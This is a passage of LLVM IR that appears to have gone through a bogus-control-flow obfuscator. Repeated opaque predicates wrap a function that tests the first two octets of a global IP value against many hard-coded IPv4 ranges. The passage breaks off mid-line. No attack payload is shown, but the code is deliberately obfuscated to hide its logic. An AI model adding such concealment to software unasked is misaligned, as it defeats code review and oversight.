  %4859 = icmp eq i32 %4858, 0
  %4860 = icmp slt i32 %4855, 10
  %4861 = or i1 %4859, %4860
  br i1 %4861, label %originalBBpart2675, label %originalBB673alteredBB

originalBBpart2675:                               ; preds = %originalBB673
  br i1 %4853, label %4862, label %4866

; <label>:4862:                                   ; preds = %originalBBpart2675
  %4863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4864 = zext i8 %4863 to i32
  %4865 = icmp slt i32 %4864, 97
  br i1 %4865, label %5234, label %4866

; <label>:4866:                                   ; preds = %4862, %originalBBpart2675, %originalBBpart2671, %4818
  %4867 = load i32, i32* @x.71
  %4868 = load i32, i32* @y.72
  %4869 = sub i32 %4867, 1
  %4870 = mul i32 %4867, %4869
  %4871 = urem i32 %4870, 2
  %4872 = icmp eq i32 %4871, 0
  %4873 = icmp slt i32 %4868, 10
  %4874 = or i1 %4872, %4873
  br i1 %4874, label %originalBB677, label %originalBB677alteredBB

originalBB677:                                    ; preds = %originalBB677alteredBB, %4866
  %4875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4876 = zext i8 %4875 to i32
  %4877 = icmp eq i32 %4876, 219
  %4878 = load i32, i32* @x.71
  %4879 = load i32, i32* @y.72
  %4880 = sub i32 %4878, 1
  %4881 = mul i32 %4878, %4880
  %4882 = urem i32 %4881, 2
  %4883 = icmp eq i32 %4882, 0
  %4884 = icmp slt i32 %4879, 10
  %4885 = or i1 %4883, %4884
  br i1 %4885, label %originalBBpart2679, label %originalBB677alteredBB

originalBBpart2679:                               ; preds = %originalBB677
  br i1 %4877, label %4886, label %4910

; <label>:4886:                                   ; preds = %originalBBpart2679
  %4887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4888 = zext i8 %4887 to i32
  %4889 = icmp sge i32 %4888, 216
  br i1 %4889, label %4890, label %4910

; <label>:4890:                                   ; preds = %4886
  %4891 = load i32, i32* @x.71
  %4892 = load i32, i32* @y.72
  %4893 = sub i32 %4891, 1
  %4894 = mul i32 %4891, %4893
  %4895 = urem i32 %4894, 2
  %4896 = icmp eq i32 %4895, 0
  %4897 = icmp slt i32 %4892, 10
  %4898 = or i1 %4896, %4897
  br i1 %4898, label %originalBB681, label %originalBB681alteredBB

originalBB681:                                    ; preds = %originalBB681alteredBB, %4890
  %4899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4900 = zext i8 %4899 to i32
  %4901 = icmp slt i32 %4900, 231
  %4902 = load i32, i32* @x.71
  %4903 = load i32, i32* @y.72
  %4904 = sub i32 %4902, 1
  %4905 = mul i32 %4902, %4904
  %4906 = urem i32 %4905, 2
  %4907 = icmp eq i32 %4906, 0
  %4908 = icmp slt i32 %4903, 10
  %4909 = or i1 %4907, %4908
  br i1 %4909, label %originalBBpart2683, label %originalBB681alteredBB

originalBBpart2683:                               ; preds = %originalBB681
  br i1 %4901, label %5234, label %4910

; <label>:4910:                                   ; preds = %originalBBpart2683, %4886, %originalBBpart2679
  %4911 = load i32, i32* @x.71
  %4912 = load i32, i32* @y.72
  %4913 = sub i32 %4911, 1
  %4914 = mul i32 %4911, %4913
  %4915 = urem i32 %4914, 2
  %4916 = icmp eq i32 %4915, 0
  %4917 = icmp slt i32 %4912, 10
  %4918 = or i1 %4916, %4917
  br i1 %4918, label %originalBB685, label %originalBB685alteredBB

originalBB685:                                    ; preds = %originalBB685alteredBB, %4910
  %4919 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4920 = zext i8 %4919 to i32
  %4921 = icmp eq i32 %4920, 23
  %4922 = load i32, i32* @x.71
  %4923 = load i32, i32* @y.72
  %4924 = sub i32 %4922, 1
  %4925 = mul i32 %4922, %4924
  %4926 = urem i32 %4925, 2
  %4927 = icmp eq i32 %4926, 0
  %4928 = icmp slt i32 %4923, 10
  %4929 = or i1 %4927, %4928
  br i1 %4929, label %originalBBpart2687, label %originalBB685alteredBB

originalBBpart2687:                               ; preds = %originalBB685
  br i1 %4921, label %4930, label %4954

; <label>:4930:                                   ; preds = %originalBBpart2687
  %4931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4932 = zext i8 %4931 to i32
  %4933 = icmp sge i32 %4932, 94
  br i1 %4933, label %4934, label %4954

; <label>:4934:                                   ; preds = %4930
  %4935 = load i32, i32* @x.71
  %4936 = load i32, i32* @y.72
  %4937 = sub i32 %4935, 1
  %4938 = mul i32 %4935, %4937
  %4939 = urem i32 %4938, 2
  %4940 = icmp eq i32 %4939, 0
  %4941 = icmp slt i32 %4936, 10
  %4942 = or i1 %4940, %4941
  br i1 %4942, label %originalBB689, label %originalBB689alteredBB

originalBB689:                                    ; preds = %originalBB689alteredBB, %4934
  %4943 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4944 = zext i8 %4943 to i32
  %4945 = icmp slt i32 %4944, 109
  %4946 = load i32, i32* @x.71
  %4947 = load i32, i32* @y.72
  %4948 = sub i32 %4946, 1
  %4949 = mul i32 %4946, %4948
  %4950 = urem i32 %4949, 2
  %4951 = icmp eq i32 %4950, 0
  %4952 = icmp slt i32 %4947, 10
  %4953 = or i1 %4951, %4952
  br i1 %4953, label %originalBBpart2691, label %originalBB689alteredBB

originalBBpart2691:                               ; preds = %originalBB689
  br i1 %4945, label %5234, label %4954

; <label>:4954:                                   ; preds = %originalBBpart2691, %4930, %originalBBpart2687
  %4955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4956 = zext i8 %4955 to i32
  %4957 = icmp eq i32 %4956, 178
  br i1 %4957, label %4958, label %4966

; <label>:4958:                                   ; preds = %4954
  %4959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4960 = zext i8 %4959 to i32
  %4961 = icmp sge i32 %4960, 62
  br i1 %4961, label %4962, label %4966

; <label>:4962:                                   ; preds = %4958
  %4963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4964 = zext i8 %4963 to i32
  %4965 = icmp slt i32 %4964, 63
  br i1 %4965, label %5234, label %4966

; <label>:4966:                                   ; preds = %4962, %4958, %4954
  %4967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4968 = zext i8 %4967 to i32
  %4969 = icmp eq i32 %4968, 106
  br i1 %4969, label %4970, label %4994

; <label>:4970:                                   ; preds = %4966
  %4971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4972 = zext i8 %4971 to i32
  %4973 = icmp sge i32 %4972, 182
  br i1 %4973, label %4974, label %4994

; <label>:4974:                                   ; preds = %4970
  %4975 = load i32, i32* @x.71
  %4976 = load i32, i32* @y.72
  %4977 = sub i32 %4975, 1
  %4978 = mul i32 %4975, %4977
  %4979 = urem i32 %4978, 2
  %4980 = icmp eq i32 %4979, 0
  %4981 = icmp slt i32 %4976, 10
  %4982 = or i1 %4980, %4981
  br i1 %4982, label %originalBB693, label %originalBB693alteredBB

originalBB693:                                    ; preds = %originalBB693alteredBB, %4974
  %4983 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4984 = zext i8 %4983 to i32
  %4985 = icmp slt i32 %4984, 189
  %4986 = load i32, i32* @x.71
  %4987 = load i32, i32* @y.72
  %4988 = sub i32 %4986, 1
  %4989 = mul i32 %4986, %4988
  %4990 = urem i32 %4989, 2
  %4991 = icmp eq i32 %4990, 0
  %4992 = icmp slt i32 %4987, 10
  %4993 = or i1 %4991, %4992
  br i1 %4993, label %originalBBpart2695, label %originalBB693alteredBB

originalBBpart2695:                               ; preds = %originalBB693
  br i1 %4985, label %5234, label %4994

; <label>:4994:                                   ; preds = %originalBBpart2695, %4970, %4966
  %4995 = load i32, i32* @x.71
  %4996 = load i32, i32* @y.72
  %4997 = sub i32 %4995, 1
  %4998 = mul i32 %4995, %4997
  %4999 = urem i32 %4998, 2
  %5000 = icmp eq i32 %4999, 0
  %5001 = icmp slt i32 %4996, 10
  %5002 = or i1 %5000, %5001
  br i1 %5002, label %originalBB697, label %originalBB697alteredBB

originalBB697:                                    ; preds = %originalBB697alteredBB, %4994
  %5003 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5004 = zext i8 %5003 to i32
  %5005 = icmp eq i32 %5004, 106
  %5006 = load i32, i32* @x.71
  %5007 = load i32, i32* @y.72
  %5008 = sub i32 %5006, 1
  %5009 = mul i32 %5006, %5008
  %5010 = urem i32 %5009, 2
  %5011 = icmp eq i32 %5010, 0
  %5012 = icmp slt i32 %5007, 10
  %5013 = or i1 %5011, %5012
  br i1 %5013, label %originalBBpart2699, label %originalBB697alteredBB

originalBBpart2699:                               ; preds = %originalBB697
  br i1 %5005, label %5014, label %5034

; <label>:5014:                                   ; preds = %originalBBpart2699
  %5015 = load i32, i32* @x.71
  %5016 = load i32, i32* @y.72
  %5017 = sub i32 %5015, 1
  %5018 = mul i32 %5015, %5017
  %5019 = urem i32 %5018, 2
  %5020 = icmp eq i32 %5019, 0
  %5021 = icmp slt i32 %5016, 10
  %5022 = or i1 %5020, %5021
  br i1 %5022, label %originalBB701, label %originalBB701alteredBB

originalBB701:                                    ; preds = %originalBB701alteredBB, %5014
  %5023 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5024 = zext i8 %5023 to i32
  %5025 = icmp sge i32 %5024, 184
  %5026 = load i32, i32* @x.71
  %5027 = load i32, i32* @y.72
  %5028 = sub i32 %5026, 1
  %5029 = mul i32 %5026, %5028
  %5030 = urem i32 %5029, 2
  %5031 = icmp eq i32 %5030, 0
  %5032 = icmp slt i32 %5027, 10
  %5033 = or i1 %5031, %5032
  br i1 %5033, label %originalBBpart2703, label %originalBB701alteredBB

originalBBpart2703:                               ; preds = %originalBB701
  br i1 %5025, label %5234, label %5034

; <label>:5034:                                   ; preds = %originalBBpart2703, %originalBBpart2699
  %5035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5036 = zext i8 %5035 to i32
  %5037 = icmp eq i32 %5036, 106
  br i1 %5037, label %5038, label %5042

; <label>:5038:                                   ; preds = %5034
  %5039 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5040 = zext i8 %5039 to i32
  %5041 = icmp eq i32 %5040, 105
  br i1 %5041, label %5234, label %5042

; <label>:5042:                                   ; preds = %5038, %5034
  %5043 = load i32, i32* @x.71
  %5044 = load i32, i32* @y.72
  %5045 = sub i32 %5043, 1
  %5046 = mul i32 %5043, %5045
  %5047 = urem i32 %5046, 2
  %5048 = icmp eq i32 %5047, 0
  %5049 = icmp slt i32 %5044, 10
  %5050 = or i1 %5048, %5049
  br i1 %5050, label %originalBB705, label %originalBB705alteredBB

originalBB705:                                    ; preds = %originalBB705alteredBB, %5042
  %5051 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5052 = zext i8 %5051 to i32
  %5053 = icmp eq i32 %5052, 34
  %5054 = load i32, i32* @x.71
  %5055 = load i32, i32* @y.72
  %5056 = sub i32 %5054, 1
  %5057 = mul i32 %5054, %5056
  %5058 = urem i32 %5057, 2
  %5059 = icmp eq i32 %5058, 0
  %5060 = icmp slt i32 %5055, 10
  %5061 = or i1 %5059, %5060
  br i1 %5061, label %originalBBpart2707, label %originalBB705alteredBB

originalBBpart2707:                               ; preds = %originalBB705
  br i1 %5053, label %5062, label %5086

; <label>:5062:                                   ; preds = %originalBBpart2707
  %5063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5064 = zext i8 %5063 to i32
  %5065 = icmp sge i32 %5064, 245
  br i1 %5065, label %5066, label %5086

; <label>:5066:                                   ; preds = %5062
  %5067 = load i32, i32* @x.71
  %5068 = load i32, i32* @y.72
  %5069 = sub i32 %5067, 1
  %5070 = mul i32 %5067, %5069
  %5071 = urem i32 %5070, 2
  %5072 = icmp eq i32 %5071, 0
  %5073 = icmp slt i32 %5068, 10
  %5074 = or i1 %5072, %5073
  br i1 %5074, label %originalBB709, label %originalBB709alteredBB

originalBB709:                                    ; preds = %originalBB709alteredBB, %5066
  %5075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5076 = zext i8 %5075 to i32
  %5077 = icmp slt i32 %5076, 255
  %5078 = load i32, i32* @x.71
  %5079 = load i32, i32* @y.72
  %5080 = sub i32 %5078, 1
  %5081 = mul i32 %5078, %5080
  %5082 = urem i32 %5081, 2
  %5083 = icmp eq i32 %5082, 0
  %5084 = icmp slt i32 %5079, 10
  %5085 = or i1 %5083, %5084
  br i1 %5085, label %originalBBpart2711, label %originalBB709alteredBB

originalBBpart2711:                               ; preds = %originalBB709
  br i1 %5077, label %5234, label %5086

; <label>:5086:                                   ; preds = %originalBBpart2711, %5062, %originalBBpart2707
  %5087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5088 = zext i8 %5087 to i32
  %5089 = icmp eq i32 %5088, 87
  br i1 %5089, label %5090, label %5098

; <label>:5090:                                   ; preds = %5086
  %5091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5092 = zext i8 %5091 to i32
  %5093 = icmp sge i32 %5092, 97
  br i1 %5093, label %5094, label %5098

; <label>:5094:                                   ; preds = %5090
  %5095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5096 = zext i8 %5095 to i32
  %5097 = icmp slt i32 %5096, 99
  br i1 %5097, label %5234, label %5098

; <label>:5098:                                   ; preds = %5094, %5090, %5086
  %5099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5100 = zext i8 %5099 to i32
  %5101 = icmp eq i32 %5100, 86
  br i1 %5101, label %5102, label %5106

; <label>:5102:                                   ; preds = %5098
  %5103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5104 = zext i8 %5103 to i32
  %5105 = icmp eq i32 %5104, 208
  br i1 %5105, label %5234, label %5106

; <label>:5106:                                   ; preds = %5102, %5098
  %5107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5108 = zext i8 %5107 to i32
  %5109 = icmp eq i32 %5108, 86
  br i1 %5109, label %5110, label %5114

; <label>:5110:                                   ; preds = %5106
  %5111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5112 = zext i8 %5111 to i32
  %5113 = icmp eq i32 %5112, 209
  br i1 %5113, label %5234, label %5114

; <label>:5114:                                   ; preds = %5110, %5106
  %5115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5116 = zext i8 %5115 to i32
  %5117 = icmp eq i32 %5116, 193
  br i1 %5117, label %5118, label %5122

; <label>:5118:                                   ; preds = %5114
  %5119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5120 = zext i8 %5119 to i32
  %5121 = icmp eq i32 %5120, 164
  br i1 %5121, label %5234, label %5122

; <label>:5122:                                   ; preds = %5118, %5114
  %5123 = load i32, i32* @x.71
  %5124 = load i32, i32* @y.72
  %5125 = sub i32 %5123, 1
  %5126 = mul i32 %5123, %5125
  %5127 = urem i32 %5126, 2
  %5128 = icmp eq i32 %5127, 0
  %5129 = icmp slt i32 %5124, 10
  %5130 = or i1 %5128, %5129
  br i1 %5130, label %originalBB713, label %originalBB713alteredBB

originalBB713:                                    ; preds = %originalBB713alteredBB, %5122
  %5131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5132 = zext i8 %5131 to i32
  %5133 = icmp eq i32 %5132, 120
  %5134 = load i32, i32* @x.71
  %5135 = load i32, i32* @y.72
  %5136 = sub i32 %5134, 1
  %5137 = mul i32 %5134, %5136
  %5138 = urem i32 %5137, 2
  %5139 = icmp eq i32 %5138, 0
  %5140 = icmp slt i32 %5135, 10
  %5141 = or i1 %5139, %5140
  br i1 %5141, label %originalBBpart2715, label %originalBB713alteredBB

originalBBpart2715:                               ; preds = %originalBB713
  br i1 %5133, label %5142, label %5166

; <label>:5142:                                   ; preds = %originalBBpart2715
  %5143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5144 = zext i8 %5143 to i32
  %5145 = icmp sge i32 %5144, 103
  br i1 %5145, label %5146, label %5166

; <label>:5146:                                   ; preds = %5142
  %5147 = load i32, i32* @x.71
  %5148 = load i32, i32* @y.72
  %5149 = sub i32 %5147, 1
  %5150 = mul i32 %5147, %5149
  %5151 = urem i32 %5150, 2
  %5152 = icmp eq i32 %5151, 0
  %5153 = icmp slt i32 %5148, 10
  %5154 = or i1 %5152, %5153
  br i1 %5154, label %originalBB717, label %originalBB717alteredBB

originalBB717:                                    ; preds = %originalBB717alteredBB, %5146
  %5155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5156 = zext i8 %5155 to i32
  %5157 = icmp slt i32 %5156, 108
  %5158 = load i32, i32* @x.71
  %5159 = load i32, i32* @y.72
  %5160 = sub i32 %5158, 1
  %5161 = mul i32 %5158, %5160
  %5162 = urem i32 %5161, 2
  %5163 = icmp eq i32 %5162, 0
  %5164 = icmp slt i32 %5159, 10
  %5165 = or i1 %5163, %5164
  br i1 %5165, label %originalBBpart2719, label %originalBB717alteredBB

originalBBpart2719:                               ; preds = %originalBB717
  br i1 %5157, label %5234, label %5166

; <label>:5166:                                   ; preds = %originalBBpart2719, %5142, %originalBBpart2715
  %5167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5168 = zext i8 %5167 to i32
  %5169 = icmp eq i32 %5168, 188
  br i1 %5169, label %5170, label %5190

; <label>:5170:                                   ; preds = %5166
  %5171 = load i32, i32* @x.71
  %5172 = load i32, i32* @y.72
  %5173 = sub i32 %5171, 1
  %5174 = mul i32 %5171, %5173
  %5175 = urem i32 %5174, 2
  %5176 = icmp eq i32 %5175, 0
  %5177 = icmp slt i32 %5172, 10
  %5178 = or i1 %5176, %5177
  br i1 %5178, label %originalBB721, label %originalBB721alteredBB

originalBB721:                                    ; preds = %originalBB721alteredBB, %5170
  %5179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5180 = zext i8 %5179 to i32
  %5181 = icmp eq i32 %5180, 68
  %5182 = load i32, i32* @x.71
  %5183 = load i32, i32* @y.72
  %5184 = sub i32 %5182, 1
  %5185 = mul i32 %5182, %5184
  %5186 = urem i32 %5185, 2
  %5187 = icmp eq i32 %5186, 0
  %5188 = icmp slt i32 %5183, 10
  %5189 = or i1 %5187, %5188
  br i1 %5189, label %originalBBpart2723, label %originalBB721alteredBB

originalBBpart2723:                               ; preds = %originalBB721
  br i1 %5181, label %5234, label %5190

; <label>:5190:                                   ; preds = %originalBBpart2723, %5166
  %5191 = load i32, i32* @x.71
  %5192 = load i32, i32* @y.72
  %5193 = sub i32 %5191, 1
  %5194 = mul i32 %5191, %5193
  %5195 = urem i32 %5194, 2
  %5196 = icmp eq i32 %5195, 0
  %5197 = icmp slt i32 %5192, 10
  %5198 = or i1 %5196, %5197
  br i1 %5198, label %originalBB725, label %originalBB725alteredBB

originalBB725:                                    ; preds = %originalBB725alteredBB, %5190
  %5199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5200 = zext i8 %5199 to i32
  %5201 = icmp eq i32 %5200, 78
  %5202 = load i32, i32* @x.71
  %5203 = load i32, i32* @y.72
  %5204 = sub i32 %5202, 1
  %5205 = mul i32 %5202, %5204
  %5206 = urem i32 %5205, 2
  %5207 = icmp eq i32 %5206, 0
  %5208 = icmp slt i32 %5203, 10
  %5209 = or i1 %5207, %5208
  br i1 %5209, label %originalBBpart2727, label %originalBB725alteredBB

originalBBpart2727:                               ; preds = %originalBB725
  br i1 %5201, label %5210, label %5230

; <label>:5210:                                   ; preds = %originalBBpart2727
  %5211 = load i32, i32* @x.71
  %5212 = load i32, i32* @y.72
  %5213 = sub i32 %5211, 1
  %5214 = mul i32 %5211, %5213
  %5215 = urem i32 %5214, 2
  %5216 = icmp eq i32 %5215, 0
  %5217 = icmp slt i32 %5212, 10
  %5218 = or i1 %5216, %5217
  br i1 %5218, label %originalBB729, label %originalBB729alteredBB

originalBB729:                                    ; preds = %originalBB729alteredBB, %5210
  %5219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5220 = zext i8 %5219 to i32
  %5221 = icmp eq i32 %5220, 46
  %5222 = load i32, i32* @x.71
  %5223 = load i32, i32* @y.72
  %5224 = sub i32 %5222, 1
  %5225 = mul i32 %5222, %5224
  %5226 = urem i32 %5225, 2
  %5227 = icmp eq i32 %5226, 0
  %5228 = icmp slt i32 %5223, 10
  %5229 = or i1 %5227, %5228
  br i1 %5229, label %originalBBpart2731, label %originalBB729alteredBB

originalBBpart2731:                               ; preds = %originalBB729
  br i1 %5221, label %5234, label %5230

; <label>:5230:                                   ; preds = %originalBBpart2731, %originalBBpart2727
  %5231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5232 = zext i8 %5231 to i32
  %5233 = icmp eq i32 %5232, 224
  br label %5234

; <label>:5234:                                   ; preds = %5230, %originalBBpart2731, %originalBBpart2723, %originalBBpart2719, %5118, %5110, %5102, %5094, %originalBBpart2711, %5038, %originalBBpart2703, %originalBBpart2695, %4962, %originalBBpart2691, %originalBBpart2683, %4862, %4814, %4766, %originalBBpart2655, %4706, %originalBBpart2647, %originalBBpart2643, %originalBBpart2635, %4566, %4522, %4510, %originalBBpart2615, %4438, %originalBBpart2607, %4394, %4378, %4346, %originalBBpart2599, %4266, %4234, %4218, %4186, %4170, %originalBBpart2575, %originalBBpart2563, %4010, %originalBBpart2551, %3962, %3930, %originalBBpart2539, %originalBBpart2527, %3786, %3762, %originalBBpart2515, %3714, %3706, %originalBBpart2503, %originalBBpart2499, %3618, %3610, %3602, %3578, %3570, %3562, %3554, %originalBBpart2487, %3522, %originalBBpart2483, %3474, %3442, %originalBBpart2471, %3378, %3362, %originalBBpart2451, %originalBBpart2439, %3186, %originalBBpart2427, %originalBBpart2419, %3074, %3026, %originalBBpart2399, %2954, %2946, %2930, %2898, %2866, %originalBBpart2383, %2786, %originalBBpart2371, %2690, %originalBBpart2355, %2626, %2610, %2562, %2546, %originalBBpart2339, %2482, %originalBBpart2335, %2418, %2402, %originalBBpart2327, %2354, %originalBBpart2315, %originalBBpart2303, %2202, %2194, %originalBBpart2291, %originalBBpart2287, %2122, %2114, %2106, %2098, %2090, %originalBBpart2283, %2058, %2050, %originalBBpart2279, %1978, %1950, %originalBBpart2259, %1894, %1882, %originalBBpart2255, %originalBBpart2243, %1782, %1770, %1742, %1730, %originalBBpart2235, %1690, %1662, %1650, %1622, %1610, %1566, %originalBBpart2211, %1494, %1482, %1454, %originalBBpart2195, %originalBBpart2187, %1338, %originalBBpart2175, %1282, %1254, %1226, %1182, %originalBBpart2147, %originalBBpart2139, %1050, %1006, %978, %966, %954, %942, %930, %902, %originalBBpart2115, %850, %822, %814, %790, %originalBBpart299, %758, %750, %originalBBpart295, %718, %694, %686, %678, %670, %originalBBpart287, %622, %originalBBpart279, %590, %566, %542, %534, %526, %502, %478, %470, %originalBBpart259, %422, %originalBBpart251, %390, %382, %374, %366, %originalBBpart243, %302, %294, %originalBBpart235, %262, %254, %246, %222, %214, %206, %198, %194, %190, %186, %originalBBpart227, %originalBBpart223, %142, %originalBBpart219, %118, %originalBBpart215, %94, %90, %86, %82, %78, %74, %70, %66, %62, %58, %54, %50, %originalBBpart211
  %5235 = phi i1 [ true, %originalBBpart2731 ], [ true, %originalBBpart2723 ], [ true, %originalBBpart2719 ], [ true, %5118 ], [ true, %5110 ], [ true, %5102 ], [ true, %5094 ], [ true, %originalBBpart2711 ], [ true, %5038 ], [ true, %originalBBpart2703 ], [ true, %originalBBpart2695 ], [ true, %4962 ], [ true, %originalBBpart2691 ], [ true, %originalBBpart2683 ], [ true, %4862 ], [ true, %4814 ], [ true, %4766 ], [ true, %originalBBpart2655 ], [ true, %4706 ], [ true, %originalBBpart2647 ], [ true, %originalBBpart2643 ], [ true, %originalBBpart2635 ], [ true, %4566 ], [ true, %4522 ], [ true, %4510 ], [ true, %originalBBpart2615 ], [ true, %4438 ], [ true, %originalBBpart2607 ], [ true, %4394 ], [ true, %4378 ], [ true, %4346 ], [ true, %originalBBpart2599 ], [ true, %4266 ], [ true, %4234 ], [ true, %4218 ], [ true, %4186 ], [ true, %4170 ], [ true, %originalBBpart2575 ], [ true, %originalBBpart2563 ], [ true, %4010 ], [ true, %originalBBpart2551 ], [ true, %3962 ], [ true, %3930 ], [ true, %originalBBpart2539 ], [ true, %originalBBpart2527 ], [ true, %3786 ], [ true, %3762 ], [ true, %originalBBpart2515 ], [ true, %3714 ], [ true, %3706 ], [ true, %originalBBpart2503 ], [ true, %originalBBpart2499 ], [ true, %3618 ], [ true, %3610 ], [ true, %3602 ], [ true, %3578 ], [ true, %3570 ], [ true, %3562 ], [ true, %3554 ], [ true, %originalBBpart2487 ], [ true, %3522 ], [ true, %originalBBpart2483 ], [ true, %3474 ], [ true, %3442 ], [ true, %originalBBpart2471 ], [ true, %3378 ], [ true, %3362 ], [ true, %originalBBpart2451 ], [ true, %originalBBpart2439 ], [ true, %3186 ], [ true, %originalBBpart2427 ], [ true, %originalBBpart2419 ], [ true, %3074 ], [ true, %3026 ], [ true, %originalBBpart2399 ], [ true, %2954 ], [ true, %2946 ], [ true, %2930 ], [ true, %2898 ], [ true, %2866 ], [ true, %originalBBpart2383 ], [ true, %2786 ], [ true, %originalBBpart2371 ], [ true, %2690 ], [ true, %originalBBpart2355 ], [ true, %2626 ], [ true, %2610 ], [ true, %2562 ], [ true, %2546 ], [ true, %originalBBpart2339 ], [ true, %2482 ], [ true, %originalBBpart2335 ], [ true, %2418 ], [ true, %2402 ], [ true, %originalBBpart2327 ], [ true, %2354 ], [ true, %originalBBpart2315 ], [ true, %originalBBpart2303 ], [ true, %2202 ], [ true, %2194 ], [ true, %originalBBpart2291 ], [ true, %originalBBpart2287 ], [ true, %2122 ], [ true, %2114 ], [ true, %2106 ], [ true, %2098 ], [ true, %2090 ], [ true, %originalBBpart2283 ], [ true, %2058 ], [ true, %2050 ], [ true, %originalBBpart2279 ], [ true, %1978 ], [ true, %1950 ], [ true, %originalBBpart2259 ], [ true, %1894 ], [ true, %1882 ], [ true, %originalBBpart2255 ], [ true, %originalBBpart2243 ], [ true, %1782 ], [ true, %1770 ], [ true, %1742 ], [ true, %1730 ], [ true, %originalBBpart2235 ], [ true, %1690 ], [ true, %1662 ], [ true, %1650 ], [ true, %1622 ], [ true, %1610 ], [ true, %1566 ], [ true, %originalBBpart2211 ], [ true, %1494 ], [ true, %1482 ], [ true, %1454 ], [ true, %originalBBpart2195 ], [ true, %originalBBpart2187 ], [ true, %1338 ], [ true, %originalBBpart2175 ], [ true, %1282 ], [ true, %1254 ], [ true, %1226 ], [ true, %1182 ], [ true, %originalBBpart2147 ], [ true, %originalBBpart2139 ], [ true, %1050 ], [ true, %1006 ], [ true, %978 ], [ true, %966 ], [ true, %954 ], [ true, %942 ], [ true, %930 ], [ true, %902 ], [ true, %originalBBpart2115 ], [ true, %850 ], [ true, %822 ], [ true, %814 ], [ true, %790 ], [ true, %originalBBpart299 ], [ true, %758 ], [ true, %750 ], [ true, %originalBBpart295 ], [ true, %718 ], [ true, %694 ], [ true, %686 ], [ true, %678 ], [ true, %670 ], [ true, %originalBBpart287 ], [ true, %622 ], [ true, %originalBBpart279 ], [ true, %590 ], [ true, %566 ], [ true, %542 ], [ true, %534 ], [ true, %526 ], [ true, %502 ], [ true, %478 ], [ true, %470 ], [ true, %originalBBpart259 ], [ true, %422 ], [ true, %originalBBpart251 ], [ true, %390 ], [ true, %382 ], [ true, %374 ], [ true, %366 ], [ true, %originalBBpart243 ], [ true, %302 ], [ true, %294 ], [ true, %originalBBpart235 ], [ true, %262 ], [ true, %254 ], [ true, %246 ], [ true, %222 ], [ true, %214 ], [ true, %206 ], [ true, %198 ], [ true, %194 ], [ true, %190 ], [ true, %186 ], [ true, %originalBBpart227 ], [ true, %originalBBpart223 ], [ true, %142 ], [ true, %originalBBpart219 ], [ true, %118 ], [ true, %originalBBpart215 ], [ true, %94 ], [ true, 